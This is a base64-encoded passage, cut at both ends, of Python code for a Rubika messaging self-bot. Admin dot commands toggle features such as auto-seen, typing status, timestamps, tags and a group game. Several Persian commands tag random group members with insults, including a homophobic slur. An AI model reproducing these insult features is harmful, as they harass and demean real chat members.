czoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIuaHlwZXIiLCIiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZCA9PSAib24iIG9yICJvZmYiOgogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCJNb2RlL0h5cGVyIiwidyIpLndyaXRlKGNvbW1hbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiJbSHlwZXJTXSh7Z3VpZH0pIPCdmYjwnZmk8J2ZmfCdmZoge2NvbW1hbmR9IikKCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiTW9kZS9jb3B5Iik6CiAgICAgICAgICAgICAgICAgICAgbW9kZSA9IG9wZW4oIk1vZGUvY29weSIpLnJlYWQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBtb2RlID0gIm9mZiIKICAgICAgICAgICAgICAgIGlmIG1vZGUgPT0gIm9uIjoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiJge3RleHR9YCIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5jb3B5IikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSB0ZXh0LnJlcGxhY2UoIi5jb3B5IiwiIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIGlmIGNvbW1hbmQgPT0gIm9uIiBvciAib2ZmIjoKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigiTW9kZS9jb3B5IiwidyIpLndyaXRlKGNvbW1hbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiJgQ29weUVzYCDwnZmI8J2ZpPCdmZnwnZmaIHtjb21tYW5kfSIpCgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoIk1vZGUvVHlwaW5nIik6CiAgICAgICAgICAgICAgICAgICAgbW9kZSA9IG9wZW4oIk1vZGUvVHlwaW5nIikucmVhZCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSAib2ZmIgogICAgICAgICAgICAgICAgaWYgbW9kZSA9PSAib24iOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgdGV4dDoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudChtZXRob2RzLmNoYXRzLlNlbmRDaGF0QWN0aXZpdHkob2JqZWN0cykpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi50eXBpbmciKSBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHRleHQucmVwbGFjZSgiLnR5cGluZyIsIiIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBpZiBjb21tYW5kID09ICJvbiIgb3IgIm9mZiI6CiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oIk1vZGUvVHlwaW5nIiwidyIpLndyaXRlKGNvbW1hbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiIqKlR5cGluZyoqIPCdmYjwnZmk8J2ZmfCdmZoge2NvbW1hbmR9IikKCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiTW9kZS9USU1FIik6CiAgICAgICAgICAgICAgICAgICAgbW9kZSA9IG9wZW4oIk1vZGUvVElNRSIpLnJlYWQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBtb2RlID0gIm9mZiIKICAgICAgICAgICAgICAgIGlmIG1vZGUgPT0gIm9uIjoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHVybCA9IGpzb24ubG9hZHMoZ2V0KGYiaHR0cDovL2FwaS5jb2RlYmF6YW4uaXIvdGltZS1kYXRlLz9qc29uPWVuIikudGV4dCkKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChmIn4+IHt1cmxbJ3Jlc3VsdCddWyd0aW1lJ119IDx+IFxue3RleHR9IikKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi50aW1lIikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSB0ZXh0LnJlcGxhY2UoIi50aW1lIiwiIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIGlmIGNvbW1hbmQgPT0gIm9uIiBvciAib2ZmIjoKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigiTW9kZS9USU1FIiwidyIpLndyaXRlKGNvbW1hbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiIqKlRJTUUqKiDwnZmI8J2ZpPCdmZnwnZmaIHtjb21tYW5kfSIpCgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoIk1vZGUvVGFncyIpOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSBvcGVuKCJNb2RlL1RhZ3MiKS5yZWFkKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgbW9kZSA9ICJvZmYiCiAgICAgICAgICAgICAgICBpZiBtb2RlID09ICJvbiI6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICB0ZXh0cyA9IHJlLnN1YigiICIsIl8iLHRleHQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiIje3RleHRzfSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIudGFnIikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSB0ZXh0LnJlcGxhY2UoIi50YWciLCIiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZCA9PSAib24iIG9yICJvZmYiOgogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCJNb2RlL1RhZ3MiLCJ3Iikud3JpdGUoY29tbWFuZCkKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChmIiNUQUdTIPCdmYjwnZmk8J2ZmfCdmZoge2NvbW1hbmR9IikKCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiTW9kZS9FbW9qZSIpOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSBvcGVuKCJNb2RlL0Vtb2plIikucmVhZCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSAib2ZmIgogICAgICAgICAgICAgICAgaWYgbW9kZSA9PSAib24iOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaXRlbXMgPSBvcGVuKCJNb2RlL1NldEVtIikucmVhZCgpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiJ7dGV4dH0ge2l0ZW1zfSIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5lbW9qZSIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIuZW1vamUiLCIiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZCA9PSAib24iIG9yICJvZmYiOgogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCJNb2RlL0Vtb2plIiwidyIpLndyaXRlKGNvbW1hbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiIqKkVNT0pFUyoq8J+YkPCfl78g8J2ZiPCdmaTwnZmZ8J2ZmiB7Y29tbWFuZH0iKSAgCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi5lbXNldCIpOgogICAgICAgICAgICAgICAgICAgIGNvbW1hbmQgPSB0ZXh0LnJlcGxhY2UoIi5lbXNldCIsICIiKQogICAgICAgICAgICAgICAgICAgIG9wZW4oIk1vZGUvU2V0RW0iLCJ3Iikud3JpdGUoY29tbWFuZCkKICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KGYi8J2ZgPCdmaLwnZmk8J2ZhfCdmZrwnZmoIPCdmY7wnZma8J2ZjyB7Y29tbWFuZH0iKQoKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKCJNb2RlLzopIik6CiAgICAgICAgICAgICAgICAgICAgbW9kZSA9IG9wZW4oIk1vZGUvOikiKS5yZWFkKCkKICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgbW9kZSA9ICJvZmYiCiAgICAgICAgICAgICAgICBpZiBtb2RlID09ICJvbiI6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KGYie3RleHR9IGA6KWAiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIudGV4dDEiKSBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHRleHQucmVwbGFjZSgiLnRleHQxIiwiIikuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgIGlmIGNvbW1hbmQgPT0gIm9uIiBvciAib2ZmIjoKICAgICAgICAgICAgICAgICAgICAgICAgb3BlbigiTW9kZS86KSIsInciKS53cml0ZShjb21tYW5kKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KGYiOikg8J2ZiPCdmaTwnZmZ8J2ZmiB7Y29tbWFuZH0iKQoKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKCJNb2RlL1NlZW4iKToKICAgICAgICAgICAgICAgICAgICBtb2RlID0gb3BlbigiTW9kZS9TZWVuIikucmVhZCgpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPSAib2ZmIgogICAgICAgICAgICAgICAgaWYgbW9kZSA9PSAib24iOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgaWYgZXZlbnQudHlwZSA9PSAiVXNlciIgb3IgZXZlbnQudHlwZSA9PSAiR3JvdXAiOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnNlZW4oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgiLnNlZW4iKSBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgY29tbWFuZCA9IHRleHQucmVwbGFjZSgiLnNlZW4iLCIiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZCA9PSAib24iIG9yICJvZmYiOgogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCJNb2RlL1NlZW4iLCJ3Iikud3JpdGUoY29tbWFuZCkKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZWRpdChmIioqU0VFTioqIPCdmYjwnZmk8J2ZmfCdmZoge2NvbW1hbmR9IikKCiAgICAgICAgICAgICAgICBpZiBvcy5wYXRoLmV4aXN0cygiTW9kZS9HYW1lIik6CiAgICAgICAgICAgICAgICAgICAgbW9kZSA9IG9wZW4oIk1vZGUvR2FtZSIpLnJlYWQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBtb2RlID0gIm9mZiIKICAgICAgICAgICAgICAgIGlmIG1vZGUgPT0gIm9uIjoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGV2ZW50LnR5cGUgPT0gIkdyb3VwIjoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiBldmVudC5vYmplY3RfZ3VpZCBpbiBncm91OgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpZiB0ZXh0ID09ICLYqNm+2LHYsyI6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIntvYmplY3RzfSA9PiB7dGV4dH0iKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgZ3VpZCBpbiBnYW1lOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHdpdGggb3BlbignZ2FtZS50eHQnLCAncicpIGFzIGdhbWVzOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhc2sgPSBjaChnYW1lcy5yZWFkbGluZXMoKSkuc3RyaXAoKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5yZXBseShhc2spCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwogICAgICAgICAgICAgICAgaWYgdGV4dC5zdGFydHN3aXRoKCIuZ2FtZSIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIuZ2FtZSIsIiIpLnN0cmlwKCkKICAgICAgICAgICAgICAgICAgICBpZiBjb21tYW5kID09ICJvbiIgb3IgIm9mZiI6CiAgICAgICAgICAgICAgICAgICAgICAgIG9wZW4oIk1vZGUvR2FtZSIsInciKS53cml0ZShjb21tYW5kKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5lZGl0KGYiKipHQU1FUyoqIPCdmYjwnZmk8J2ZmfCdmZoge2NvbW1hbmR9IikKICAgICAgICAKICAgICAgICAgICAgICAgIGlmIHRleHQgPT0gIi5nYWQiIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGdyb3UuYXBwZW5kKG9iamVjdHMpCiAgICAgICAgICAgICAgICAgICAgICAgIGlkcyA9IGF3YWl0IGNsaWVudChtZXRob2RzLm1lc3NhZ2VzLkdldE1lc3NhZ2VzQnlJRChvYmplY3RzLG1lc3NhZ2VfaWRzPXJlcGx5KSkKICAgICAgICAgICAgICAgICAgICAgICAgdXMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy51c2Vycy5HZXRVc2VySW5mbyhpZHMuYXV0aG9yX29iamVjdF9ndWlkKSkKICAgICAgICAgICAgICAgICAgICAgICAgZ2FtZS5hcHBlbmQodXMudXNlci51c2VyX2d1aWQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmRlbGV0ZV9tZXNzYWdlcygpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGNsaWVudChtZXRob2RzLm1lc3NhZ2VzLlNlbmRNZXNzYWdlKG9iamVjdHMsbWVzc2FnZT1mIiIiCuKAuiDaqdin2LHYqNixIFsge3VzLnVzZXIuZmlyc3RfbmFtZX1dKHt1cy51c2VyLnVzZXJfZ3VpZH0pICAgICAKCuKAuuKAuiDYqNmHINio2KfYstuMINin2LbYp9mB2Ycg2LTYrwoK2KjYsdin24wg2b7Ysdiz2LQg2KfYsiDaqdmE2YXZhyAoINio2b7YsdizICkg2KfYs9iq2YHYp9iv2Ycg2qnZhtuM2K8KICAgICIiIixyZXBseV90b19tZXNzYWdlX2lkPWV2ZW50Lm1lc3NhZ2UucmVwbHlfdG9fbWVzc2FnZV9pZCkpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAgICAgaWYgdGV4dCA9PSAiLnJtIiBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBpZHMgPSBhd2FpdCBjbGllbnQobWV0aG9kcy5tZXNzYWdlcy5HZXRNZXNzYWdlc0J5SUQob2JqZWN0cyxtZXNzYWdlX2lkcz1yZXBseSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHVzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMudXNlcnMuR2V0VXNlckluZm8oaWRzLmF1dGhvcl9vYmplY3RfZ3VpZCkpCiAgICAgICAgICAgICAgICAgICAgICAgIGdhbWUucmVtb3ZlKHVzLnVzZXIudXNlcl9ndWlkKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5kZWxldGVfbWVzc2FnZXMoKQogICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBjbGllbnQobWV0aG9kcy5tZXNzYWdlcy5TZW5kTWVzc2FnZShvYmplY3RzLG1lc3NhZ2U9ZiIiIgrigLog2qnYp9ix2KjYsSBbIHt1cy51c2VyLmZpcnN0X25hbWV9XSh7dXMudXNlci51c2VyX2d1aWR9KSAgICAgCgrigLrigLog2KfYsiDYqNin2LLbjCDYrdiw2YEg2LTYryAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAiIiIscmVwbHlfdG9fbWVzc2FnZV9pZD1ldmVudC5tZXNzYWdlLnJlcGx5X3RvX21lc3NhZ2VfaWQpKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgi2qnbjCDaqdmI2YbbjNmHIikgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgZGlhbG9ncyA9IGF3YWl0IGNsaWVudChtZXRob2RzLmdyb3Vwcy5HZXRHcm91cEFsbE1lbWJlcnMoZ3JvdXBfZ3VpZD0gZXZlbnQub2JqZWN0X2d1aWQgLHNlYXJjaF90ZXh0PU5vbmUsIHN0YXJ0X2lkPU5vbmUpKQogICAgICAgICAgICAgICAgICAgICAgICByYW5kb20gPSBjaChkaWFsb2dzLmluX2NoYXRfbWVtYmVycykKICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9IHJhbmRvbS5maXJzdF9uYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYi2KfbjNmGIFsge25hbWV9XSh7cmFuZG9tLm1lbWJlcl9ndWlkfSkg2qnZiNmG24zZhyDwn5q24oCN4pmC77iP8J+YgiIpCiAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgIGlmIHRleHQuc3RhcnRzd2l0aCgi2qnbjCDYrtix2YciKSBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBkaWFsb2dzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMuZ3JvdXBzLkdldEdyb3VwQWxsTWVtYmVycyhncm91cF9ndWlkPSBldmVudC5vYmplY3RfZ3VpZCAsc2VhcmNoX3RleHQ9Tm9uZSwgc3RhcnRfaWQ9Tm9uZSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHJhbmRvbSA9IGNoKGRpYWxvZ3MuaW5fY2hhdF9tZW1iZXJzKQogICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gcmFuZG9tLmZpcnN0X25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoZiLYp9uM2YYgWyB7bmFtZX1dKHtyYW5kb20ubWVtYmVyX2d1aWR9KSDYrtix2Ycg8J+YgvCfmJAiKQogICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKICAgICAgICAgICAgICAgIGlmIHRleHQgPT0gItqp24wg2KjYpyDaqduMINix2YQg2YXbjNiy2YbZhyIgb3IgdGV4dCA9PSAi2qnbjNinINix2YQg2YXbjNiy2YbZhiIgb3IgdGV4dCA9PSAi2qnbjCDYqNinINqp24wg2LHZhCDZhduM2LLZhti5IiBvciB0ZXh0ID09ICLaqduMINio2KfYuSDaqduMINix2YQg2YXbjNiy2YbYuSIgYW5kIGd1aWQgPT0gYWRtaW5zOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgZGlhbG9ncyA9IGF3YWl0IGNsaWVudChtZXRob2RzLmdyb3Vwcy5HZXRHcm91cEFsbE1lbWJlcnMoZ3JvdXBfZ3VpZD0gZXZlbnQub2JqZWN0X2d1aWQgLHNlYXJjaF90ZXh0PU5vbmUsIHN0YXJ0X2lkPU5vbmUpKQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiByYW5nZSgyKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJhbmRvbSA9IGNoKGRpYWxvZ3MuaW5fY2hhdF9tZW1iZXJzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFuZG9tMSA9IGNoKGRpYWxvZ3MuaW5fY2hhdF9tZW1iZXJzKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgbmFtZSA9IHJhbmRvbS5maXJzdF9uYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lMSA9IHJhbmRvbTEuZmlyc3RfbmFtZQogICAgICAgICAgICAgICAgICAgICAgICBpZiBuYW1lID09IG5hbWUxOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQuZGVsZXRlX21lc3NhZ2VzKCkKICAgICAgICAgICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LnJlcGx5KGYiIiIK2KfbjNmGIFsge25hbWV9XSh7cmFuZG9tLm1lbWJlcl9ndWlkfSkKCtio2Kcg2KfbjNmGIFsge25hbWUxfV0oe3JhbmRvbTEubWVtYmVyX2d1aWR9KSAKCtix2YQg2YXbjNiy2YbZhyDinaTvuI/wn5e/ICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAiIiIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAgICAgaWYgdGV4dCA9PSAi2qnbjCDaqduM2Ygg2YXbjNqp2YbZhyIgb3IgdGV4dCA9PSAi2qnbjCDZhduM2qnZhtmHIiBvciB0ZXh0ID09ICLaqduMINin2YjZhiDbjNqp24zZiCDZhduM2qnZhtmHIiBvciB0ZXh0ID09ICLaqduMINqp24zZiCDZhduM2qnZhti5IiBhbmQgZ3VpZCA9PSBhZG1pbnM6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBkaWFsb2dzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMuZ3JvdXBzLkdldEdyb3VwQWxsTWVtYmVycyhncm91cF9ndWlkPSBldmVudC5vYmplY3RfZ3VpZCAsc2VhcmNoX3RleHQ9Tm9uZSwgc3RhcnRfaWQ9Tm9uZSkpCiAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpIGluIHJhbmdlKDIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgcmFuZG9tID0gY2goZGlhbG9ncy5pbl9jaGF0X21lbWJlcnMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByYW5kb20xID0gY2goZGlhbG9ncy5pbl9jaGF0X21lbWJlcnMpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gcmFuZG9tLmZpcnN0X25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgICAgIG5hbWUxID0gcmFuZG9tMS5maXJzdF9uYW1lCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5hbWUgPT0gbmFtZTE6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBhd2FpdCBldmVudC5kZWxldGVfbWVzc2FnZXMoKQogICAgICAgICAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoZiIiIgrYp9uM2YYgWyB7bmFtZX1dKHtyYW5kb20ubWVtYmVyX2d1aWR9KQoK2KfbjNmG2Ygg2YXbjNqp2YbZhyBbIHtuYW1lMX1dKHtyYW5kb20xLm1lbWJlcl9ndWlkfSkg8J+SpgoKICAgICAgICAgICAgICAgICAgICAgICAgIiIiKQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgICAgIGlmIHRleHQgPT0gItqp24wg2KjYp9mFINix2YQg2YXbjNiy2YbZhyIgb3IgdGV4dCA9PSAi2qnbjCDYqNin2YfYp9mFINix2YQg2YXbjNiy2YbYuSIgb3IgdGV4dCA9PSAi2qnbjCDYqNin2YfYp9mFINix2YQg2YXbjNiy2YbZhyIgb3IgdGV4dCA9PSAi2qnbjCDYsdmEINmF24zYstmG2YciIG9yIHRleHQgPT0gItqp24wg2KjYp9mFINix2YQg2YXbjNiy2YbYuSI6CiAgICAgICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgICAgICBkaWFsb2dzID0gYXdhaXQgY2xpZW50KG1ldGhvZHMuZ3JvdXBzLkdldEdyb3VwQWxsTWVtYmVycyhncm91cF9ndWlkPSBldmVudC5vYmplY3RfZ3VpZCAsc2VhcmNoX3RleHQ9Tm9uZSwgc3RhcnRfaWQ9Tm9uZSkpCiAgICAgICAgICAgICAgICAgICAgICAgIHJhbmRvbSA9IGNoKGRpYWxvZ3MuaW5fY2hhdF9tZW1iZXJzKQogICAgICAgICAgICAgICAgICAgICAgICBuYW1lID0gcmFuZG9tLmZpcnN0X25hbWUKICAgICAgICAgICAgICAgICAgICAgICAgYXdhaXQgZXZlbnQucmVwbHkoZiLYp9uM2YYgWyB7bmFtZX1dKHtyYW5kb20ubWVtYmVyX2d1aWR9KSDYqNin2YfYp9iqINix2YQg2YXbjNiy2YbZhyIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoIk1vZGUvdGV4dDIiKToKICAgICAgICAgICAgICAgICAgICBtb2RlID0gb3BlbigiTW9kZS90ZXh0MiIpLnJlYWQoKQogICAgICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgICAgICBtb2RlID0gIm9mZiIKICAgICAgICAgICAgICAgIGlmIG1vZGUgPT0gIm9uIjoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiJ7dGV4dH0gYDovYCIpCiAgICAgICAgICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgICAgICAgICBwYXNzCiAgICAgICAgICAgICAgICBpZiB0ZXh0LnN0YXJ0c3dpdGgoIi50ZXh0MiIpIGFuZCBndWlkID09IGFkbWluczoKICAgICAgICAgICAgICAgICAgICBjb21tYW5kID0gdGV4dC5yZXBsYWNlKCIudGV4dDIiLCIiKS5zdHJpcCgpCiAgICAgICAgICAgICAgICAgICAgaWYgY29tbWFuZCA9PSAib24iIG9yICJvZmYiOgogICAgICAgICAgICAgICAgICAgICAgICBvcGVuKCJNb2RlL3RleHQyIiwidyIpLndyaXRlKGNvbW1hbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGF3YWl0IGV2ZW50LmVkaXQoZiI6LyDwnZmI8J2ZpPCdmZnwnZmaIHtjb21tYW5kfSIpCgogICAgICAgICAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoIk1vZGUvTG9jayIpOgogICAgICAgICAgICAgICAgICAgIG1vZGUgPS